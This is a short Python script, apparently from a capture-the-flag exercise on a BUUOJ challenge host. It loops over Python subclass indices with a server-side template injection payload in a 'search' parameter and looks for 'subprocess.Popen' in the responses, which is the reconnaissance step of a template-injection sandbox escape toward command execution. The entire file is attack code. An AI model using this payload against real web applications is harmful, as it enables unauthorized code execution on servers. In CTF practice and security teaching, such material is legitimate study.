import requests
if __name__ == '__main__':
    for i in range(1,100):
        url = 'http://75d78e53-e7ba-4282-a742-9f79c58262e5.node3.buuoj.cn/?search={{[].__class__.__base__.__subclasses__()[' + str(i) + '].__init__}}'
        result = requests.get(url).content.decode('utf-8')
        # unbound method catch_warnings.__init__
        if '.__init__' in result:
            print(i)
        if 'subprocess.Popen' in result:
            print(i)